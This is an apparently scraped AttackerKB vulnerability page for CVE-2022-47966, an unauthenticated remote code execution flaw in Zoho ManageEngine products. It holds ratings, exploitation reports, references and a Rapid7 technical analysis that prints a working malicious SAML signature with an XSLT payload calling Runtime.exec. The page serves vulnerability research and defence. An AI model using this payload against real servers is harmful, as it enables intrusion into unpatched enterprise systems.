Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[exploit/windows/http/manageengine\_endpoint\_central\_saml\_rce\_cve\_2022\_47966](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966.rb "exploit/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966")
[exploit/multi/http/manageengine\_servicedesk\_plus\_saml\_rce\_cve\_2022\_47966](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966.rb "exploit/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966")
[exploit/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb "exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966")

[CISA KEV Listed](/search?q=cisa_kev_listed&qt=tag)[Common in enterprise](/search?q=common_enterprise&qt=tag)[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Observed in ransomware attacks](/search?q=observed_in_ransomware&qt=tag)[Observed in state-sponsored attacks](/search?q=observed_in_state_sponsored_attacks&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Difficult to weaponize](/search?q=difficult_to_develop&qt=tag)[Vulnerable in uncommon configuration](/search?q=obscure_configuration&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

Multiple Zoho ManageEngine on-premise products, such as ServiceDesk Plus through 14003, allow remote code execution due to use of Apache Santuario xmlsec (aka XML Security for Java) 1.4.1, because the xmlsec XSLT features, by design in that version, make the application responsible for certain security protections, and the ManageEngine applications did not provide those protections. This affects Access Manager Plus before 4308, Active Directory 360 before 4310, ADAudit Plus before 7081, ADManager Plus before 7162, ADSelfService Plus before 6211, Analytics Plus before 5150, Application Control Plus before 10.1.2220.18, Asset Explorer before 6983, Browser Security Plus before 11.1.2238.6, Device Control Plus before 10.1.2220.18, Endpoint Central before 10.1.2228.11, Endpoint Central MSP before 10.1.2228.11, Endpoint DLP before 10.1.2137.6, Key Manager Plus before 6401, OS Deployer before 1.1.2243.1, PAM 360 before 5713, Password Manager Pro before 12124, Patch Manager Plus before 10.1.2220.18, Remote Access Plus before 10.1.2228.11, Remote Monitoring and Management (RMM) before 10.1.41. ServiceDesk Plus before 14004, ServiceDesk Plus MSP before 13001, SupportCenter Plus before 11026, and Vulnerability Manager Plus before 10.1.2220.18. Exploitation is only possible if SAML SSO has ever been configured for a product (for some products, exploitation requires that SAML SSO is currently active).

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)
* [![Rapid7](/static/public/img/rapid7-logo-light.svg)
  ![Rapid7](/static/public/img/rapid7-logo-dark.svg)
  Analysis](#rapid7-analysis)

## Add Assessment

[Log in to add an Assessment](/login)

4

[![](https://avatars.githubusercontent.com/u/104588115?v=4&s=50)](/contributors/rbowes-r7)

**[rbowes-r7 (95)](/contributors/rbowes-r7)**
![](/static/public/img/Badges-20-assessments.svg)

[January 20, 2023 11:16pm UTC (1 year ago)](/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)•
Edited 1 year ago ▾

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Low
[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Vulnerable in uncommon configuration](/search?q=obscure_configuration&qt=tag)
###### Technical Analysis

This is a sorta complicated collection of vulnerabilities. In the Rapid7 analysis, we focused on the two most popular pieces of software, which run an ancient version of Santuario 1.4.1 (in part because the public PoCs target that version). Santuario 1.4.1 has absolutely trivial RCE issues.

But, according to the [disclosure blog](https://blog.viettelcybersecurity.com/saml-show-stopper/), other versions have more recent versions of Santuario, but run a version of Xalan that’s vulnerable to a whole other issue – CVE-2014-0107. Dinh found a novel way to exploit CVE-2014-0107, which is super cool, but it was overshadowed by the much simpler vuln in Santuario. I wish they’d named the specific software that CVE-2014-0107 worked against – that’d be a neat one to test, but I don’t think their blog is specific.

The saving grace here is that none of these projects are vulnerable unless SAML is enabled (although in some cases, they’re vulnerable forever if SAML is enabled once).

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)
[Delete Assessment and Exploited in the Wild Report](/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-781d7e47-5942-4f26-8077-58445ad9f99f)

1

[![](https://avatars.githubusercontent.com/u/40408740?v=4&s=50)](/contributors/ccondon-r7)

**[ccondon-r7 (286)](/contributors/ccondon-r7)**
![](/static/public/img/Badges-50-assessments.svg)

[January 23, 2023 4:14pm UTC (1 year ago)](/assessments/5bf0bde9-001e-4863-8720-4e57621d0539)

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Medium
[Common in enterprise](/search?q=common_enterprise&qt=tag)[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)[Difficult to weaponize](/search?q=difficult_to_develop&qt=tag)[Vulnerable in uncommon configuration](/search?q=obscure_configuration&qt=tag)
###### Technical Analysis

Tagging this as both “easy to weaponize” and “difficult to weaponize” since it depends on the product the attacker is targeting. ServiceDesk Plus is trivial to exploit using public PoC (see **[@rbowes-r7](/contributors/rbowes-r7)**’s [assessment](https://attackerkb.com/assessments/781d7e47-5942-4f26-8077-58445ad9f99f)), but other vectors like ADSelfService Plus seem to require some type of info leak to supply the attacker with unique environment values needed to allow the exploit code to execute successfully, as **[@sfewer-r7](/contributors/sfewer-r7)** has demonstrated in our lab. So exploitability for (at least) ServiceDesk Plus is very high, but so far exploitability for (so far) ADSelfService Plus is relatively low. If someone finds an automagical way to obtain the GUID and issuer URL for ADSSP, that’d change the risk calculus some.

Rapid7 is seeing ongoing exploitation of this vulnerability in ServiceDesk Plus, and our honeypots are also seeing activity. The [Rapid7 analysis](https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis?referrer=etrblog/&utm_source=rapid7site&utm_medium=referral&utm_campaign=etr_cve-2022-47966) tab has a ton of detailed technical info.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/5bf0bde9-001e-4863-8720-4e57621d0539)
[Delete Assessment and Exploited in the Wild Report](/assessments/5bf0bde9-001e-4863-8720-4e57621d0539)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-5bf0bde9-001e-4863-8720-4e57621d0539)

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

9.8 Critical

Impact Score:

5.9

Exploitability Score:

3.9

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Attack Vector (AV):

Network

Attack Complexity (AC):

Low

Privileges Required (PR):

None

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

High

Integrity (I):

High

Availability (A):

High

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions
n/a
Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module

Unknown

Reporter

Unknown

### Vendors

* zohocorp

### Products

* manageengine access manager plus,
* manageengine access manager plus 4.3,
* manageengine ad360,
* manageengine ad360 4.3,
* manageengine adaudit plus,
* manageengine adaudit plus 7.0,
* manageengine admanager plus,
* manageengine admanager plus 7.1,
* manageengine adselfservice plus,
* manageengine adselfservice plus 6.2,
* manageengine analytics plus,
* manageengine analytics plus 5.1,
* manageengine application control plus,
* manageengine assetexplorer,
* manageengine assetexplorer 6.9,
* manageengine browser security plus,
* manageengine device control plus,
* manageengine endpoint dlp plus,
* manageengine key manager plus,
* manageengine key manager plus 6.4,
* manageengine os deployer,
* manageengine pam360,
* manageengine pam360 5.7,
* manageengine password manager pro,
* manageengine password manager pro 12.1,
* manageengine patch manager plus,
* manageengine remote access plus,
* manageengine remote monitoring and management central,
* manageengine servicedesk plus,
* manageengine servicedesk plus 14.0,
* manageengine servicedesk plus msp,
* manageengine servicedesk plus msp 13.0,
* manageengine supportcenter plus 11.0,
* manageengine vulnerability manager plus

### Metasploit Modules

[exploit/windows/http/manageengine\_endpoint\_central\_saml\_rce\_cve\_2022\_47966 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/manageengine\_endpoint\_central\_saml\_rce\_cve\_2022\_47966.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/manageengine_endpoint_central_saml_rce_cve_2022_47966.rb)
[exploit/multi/http/manageengine\_servicedesk\_plus\_saml\_rce\_cve\_2022\_47966 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine\_servicedesk\_plus\_saml\_rce\_cve\_2022\_47966.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966.rb)
[exploit/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966 (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine\_adselfservice\_plus\_saml\_rce\_cve\_2022\_47966.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb)

### Exploited in the Wild

Reported by:
![](https://avatars.githubusercontent.com/u/33330829?v=4&s=50)

[mkienow-r7](/contributors/mkienow-r7)
 indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/known-exploited-vulnerabilities-catalog)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

[Reported: January 23, 2023 4:07pm UTC (1 year ago)](#exploited-in-the-wild_1d16f9b2-7bcc-4e1d-bd7c-93cff5364bc5)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_1d16f9b2-7bcc-4e1d-bd7c-93cff5364bc5)

![](https://avatars.githubusercontent.com/u/40408740?v=4&s=50)

[ccondon-r7](/contributors/ccondon-r7)
 indicated source as
 News Article or Blog  [(https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/?referrer=etrblog/&utm\_source=rapid7site&utm\_medium=referral&utm\_campaign=etr\_cve-2022-47966)](https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/?referrer=etrblog/&utm_source=rapid7site&utm_medium=referral&utm_campaign=etr_cve-2022-47966)

[Reported: January 23, 2023 4:14pm UTC (1 year ago)](#exploited-in-the-wild_9c3c0bdd-7a98-48de-a889-f351a2aec7cf)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_9c3c0bdd-7a98-48de-a889-f351a2aec7cf)

![](https://avatars.githubusercontent.com/u/63261883?v=4&s=50)

[gwillcox-r7](/contributors/gwillcox-r7)
 indicated sources as

* Threat Feed [(https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/)](https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/)
* News Article or Blog [(https://businessinsights.bitdefender.com/tech-advisory-manageengine-cve-2022-47966)](https://businessinsights.bitdefender.com/tech-advisory-manageengine-cve-2022-47966)

[Reported: February 27, 2023 4:35pm UTC (1 year ago)](#exploited-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677) •
Edited 1 year ago

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

![](https://avatars.githubusercontent.com/u/117099647?v=4&s=50)

[cbeek-r7](/contributors/cbeek-r7)
 indicated source as
 Government or Industry Alert  [(https://blog.talosintelligence.com/lazarus-quiterat/)](https://blog.talosintelligence.com/lazarus-quiterat/)

[Reported: August 25, 2023 7:30am UTC (1 year ago)](#exploited-in-the-wild_e28f53e6-cf6f-4b91-89be-6cb19dfd4315)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_e28f53e6-cf6f-4b91-89be-6cb19dfd4315)

![](/static/public/img/akb-worker-avatar.png)

AttackerKB Worker indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/news-events/alerts/2023/01/23/cisa-adds-one-known-exploited-vulnerability-catalog)](https://www.cisa.gov/news-events/alerts/2023/01/23/cisa-adds-one-known-exploited-vulnerability-catalog)

[Reported: November 08, 2024 8:24am UTC (2 months ago)](#exploited-in-the-wild_31e66e4c-4930-4bfd-9bb2-e48a795fa885)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_31e66e4c-4930-4bfd-9bb2-e48a795fa885)

### References

##### Canonical

[CVE-2022-47966 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47966)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47966)
##### Advisory

[CISA Security Bulletin (https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a)
##### Exploit

PoCs that have not been added by contributors directly have been sourced from:
[nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub).

A PoC added here by the AKB Worker must have at least 2 GitHub stars.

[CVE-2022-47966-Scan (https://github.com/vonahisec/CVE-2022-47966-Scan)](https://github.com/vonahisec/CVE-2022-47966-Scan) (Added by AKB Worker)[CVE-2022-47966 (https://github.com/Inplex-sys/CVE-2022-47966)](https://github.com/Inplex-sys/CVE-2022-47966) (Added by AKB Worker)
##### Miscellaneous

<https://manageengine.com><https://github.com/apache/santuario-xml-security-java/tags?after=1.4.6><https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html><http://packetstormsecurity.com/files/170882/Zoho-ManageEngine-ServiceDesk-Plus-14003-Remote-Code-Execution.html><http://packetstormsecurity.com/files/170925/ManageEngine-ADSelfService-Plus-Unauthenticated-SAML-Remote-Code-Execution.html><http://packetstormsecurity.com/files/170943/Zoho-ManageEngine-Endpoint-Central-MSP-10.1.2228.10-Remote-Code-Execution.html><https://blog.viettelcybersecurity.com/saml-show-stopper/><https://github.com/horizon3ai/CVE-2022-47966><https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/><https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a><https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7
[January 20, 2023 11:11pm UTC (1 year ago)](/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis)

###### Technical Analysis

## Description

CVE-2022-47966 is an unauthenticated remote code execution vulnerability that affects two dozen Zoho ManageEngine products, including ADSelfService Plus, ServiceDesk Plus, and Password Manager Pro, all of which have been exploited in the wild over the past year. The vulnerability arises from an outdated dependency on Apache Santuario, which is itself vulnerable to remote code execution going back to 2008. Successful exploitation of vulnerable ManageEngine products requires the target system to have SAML-based SSO. Some implementations are only vulnerable if SAML-based SSO is currently active, and others merely require it to have been enabled at some point in the past. See [Zoho’s advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) for complete details on vulnerable products.

Rapid7’s incident response team has [confirmed multiple instances of exploitation in the wild](https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/) in customer environments as of Thursday, January 19, 2023. Rapid7 observed exploitation as early as Tuesday, January 17, 2023. Security firm Horizon3 published [technical details](https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/), including a proof of concept (PoC), on Thursday, January 19.

**Important note:** This analysis will demonstrate that while the product the public PoC targets (ServiceDesk Plus) seems to be exploitable without any special modifications, the other product we tested (ADSelfService Plus) requires an attacker to obtain and modify the PoC with two additional pieces of data (a unique GUID value and an `Issuer URL`) for successful exploitation. **In other words, for at least one product (and possibly others), the exploit needs to be customized not only to the product, but to the individual target.**

## Affected products

Zoho released patches for affected products in October and November of 2022; the exact timing of fixed version releases varies by product. Releasing patches 2-3 months before releasing the advisory is unusual, and potentially gave adversaries a wide window while nobody was aware of the critical nature of these patches. See ManageEngine’s [advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) for specific product and version information.

The full list of affected ManageEngine products are:

* Access Manager Plus version 4307 and below\*
* Active Directory 360 version 4309 and below\*\*
* ADAudit Plus version 7080 and below\*\*
* ADManager Plus version 7161 and below\*\*
* ADSelfService Plus version 6210 and below\*\*
* Analytics Plus version 5140 and below\*
* Application Control Plus version 10.1.2220.17 and below\*
* Asset Explorer version 6982 and below\*\*
* Browser Security Plus version 11.1.2238.5 and below\*
* Device Control Plus version 10.1.2220.17 and below\*
* Endpoint Central version 10.1.2228.10 and below\*
* Endpoint Central MSP version 10.1.2228.10 and below\*
* Endpoint DLP version 10.1.2137.5 and below\*
* Key Manager Plus version 6400 and below\*
* OS Deployer version 1.1.2243.0 and below\*
* PAM 360 version 5712 and below\*
* Password Manager Pro version 12123 and below\*
* Patch Manager Plus version 10.1.2220.17 and below\*
* Remote Access Plus version 10.1.2228.10 and below\*
* Remote Monitoring and Management (RMM) version 10.1.40 and below\*
* ServiceDesk Plus version 14003 and below\*\*
* ServiceDesk Plus MSP version 13000 and below\*\*
* SupportCenter Plus version 11017 to 11025\*\*
* Vulnerability Manager Plus version 10.1.2220.17 and below\*

\* Vulnerable if configured SAML-based SSO and it is currently active.

\*\* Vulnerable if configured SAML-based SSO at least once in the past, regardless of the current SAML-based SSO status.

## Background

On October 25, 2022, [Khoa Dinh](https://twitter.com/_l0gg) from Viettel Cyber Security [reported](https://blog.viettelcybersecurity.com/saml-show-stopper/) a number of security vulnerabilities in Zoho’s ManageEngine products related to the usage of outdated libraries (specifically, [Apache Santuario](https://santuario.apache.org/javaindex.html) or `xmlsec`). Zoho began rolling out patches to their products to include the updated libraries a few days later, but didn’t post a public advisory until a few months later in January, 2023.

Dinh’s work, in turn, was based on earlier work from An Trinh of [tint0](https://blog.tint0.com/), who wrote about [some issues in Santuario](https://blog.tint0.com/2021/09/pinging-xmlsec.html) in September of 2021. Trinh wrote about Santuario vulnerabilities in the context of an XML external entity injection (XXE) vulnerability in PingFederate ([CVE-2021-41770](https://nvd.nist.gov/vuln/detail/CVE-2021-41770)).

Several different known vulnerabilities in Santuario are at play here:

* **[CVE-2021-40690](https://santuario.apache.org/secadv.data/CVE-2021-40690.txt.asc):** A vulnerability in the way Santuario parses XML that can bypass the `secureValidation` setting (Santuario versions before 2.2.3 and 2.1.7)
* **[CVE-2014-0107](https://issues.apache.org/jira/browse/XALANJ-2435):** A vulnerability in the Xalan XSLT parser that permits an attacker to instantiate an arbitrary class (Xalan versions prior to 2.7.2, [which are still quite common](https://mvnrepository.com/artifact/xalan/xalan))
* **[Bugzilla 44629](https://bz.apache.org/bugzilla/show_bug.cgi?id=44629):** A vulnerability from 2008 where transformations were performed before signature validation (Santuario versions prior to 1.4.2)

Different versions of ManageEngine products use different versions of Santuario and/or Xalan, but the two that we tested (ADSelfService Plus 6122 and ServiceDesk Plus 14003) both used Santuario 1.4.1, so we will focus on that for the remainder of our analysis. The [research from Dinh](https://blog.viettelcybersecurity.com/saml-show-stopper/) is much deeper than this one version of Santuario and is a great read!

## Technical analysis

### Santuario 1.4.1

[Apache Santuario](https://santuario.apache.org/download.html) (also known as `xmlsec`) version 1.4.1, performs [XSLT](https://en.wikipedia.org/wiki/XSLT) transformations prior to validating a message’s signature, which can lead the execution of arbitrary Java code. This was [fixed in 2008](https://bz.apache.org/bugzilla/show_bug.cgi?id=44629), but Zoho’s software was still using a vulnerable dependency.

In the code below, we can see how the signature verification [2] is performed after the signature (`SignedInfo`) is verified [1]. That means that a malicious `XMLSignature` can have a `SignedInfo` field that contains XSLT transformations that execute arbitrary Java code when applied. Because the Signature verification occurs *after* this has happened, failing the signature check doesn’t prevent the transformations from happening.

```
// xmlsec-1.4.1.jar!\org\apache\xml\security\signature\XMLSignature.class
  public boolean checkSignatureValue(Key paramKey) throws XMLSignatureException {
    if (paramKey == null) {
      Object[] arrayOfObject = { "Didn't get a key" };
      throw new XMLSignatureException("empty", arrayOfObject);
    }
    try {
      SignedInfo signedInfo = getSignedInfo();
      if (!signedInfo.verify(this._followManifestsDuringValidation)) // <-----  [1]
        return false;
      SignatureAlgorithm signatureAlgorithm = signedInfo.getSignatureAlgorithm();
      if (log.isDebugEnabled()) {
        log.debug("SignatureMethodURI = " + signatureAlgorithm.getAlgorithmURI());
        log.debug("jceSigAlgorithm    = " + signatureAlgorithm.getJCEAlgorithmString());
        log.debug("jceSigProvider     = " + signatureAlgorithm.getJCEProviderName());
        log.debug("PublicKey = " + paramKey);
      }
      signatureAlgorithm.initVerify(paramKey);
      SignerOutputStream signerOutputStream = new SignerOutputStream(signatureAlgorithm);
      UnsyncBufferedOutputStream unsyncBufferedOutputStream = new UnsyncBufferedOutputStream((OutputStream)signerOutputStream);
      signedInfo.signInOctectStream((OutputStream)unsyncBufferedOutputStream);
      try {
        unsyncBufferedOutputStream.close();
      } catch (IOException iOException) {}
      byte[] arrayOfByte = getSignatureValue();
      return signatureAlgorithm.verify(arrayOfByte); // <-----  [2]
    } catch (XMLSecurityException xMLSecurityException) {
      throw new XMLSignatureException("empty", xMLSecurityException);
    }
  }

```

As seen in the [public PoC](https://github.com/horizon3ai/CVE-2022-47966), a malicious signature can be constructed that, via XSLT transformations, will construct an arbitrary `java.lang.Runtime` object instance and call the `exec` method to execute an attacker-supplied command. An attacker is not limited to executing arbitrary commands, and may construct a more complex Java-based payload ([including a fully in-memory reverse shell](https://twitter.com/Junior_Baines/status/1616166860843622402)).

```
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_b5a2e9aa-8955-4ac6-94f5-334047882600">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
              <xsl:stylesheet version="1.0"
                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                  <xsl:variable name="rtobject" select="rt:getRuntime()"/>
                  <xsl:variable name="process" select="rt:exec($rtobject,'calc.exe')"/>
                  <xsl:variable name="processString" select="ob:toString($process)"/>
                  <xsl:value-of select="$processString"/>
                </xsl:template>
              </xsl:stylesheet>
            </ds:Transform>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>H7gKuO6t9MbCJZujA9S7WlLFgdqMuNe0145KRwKl000=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
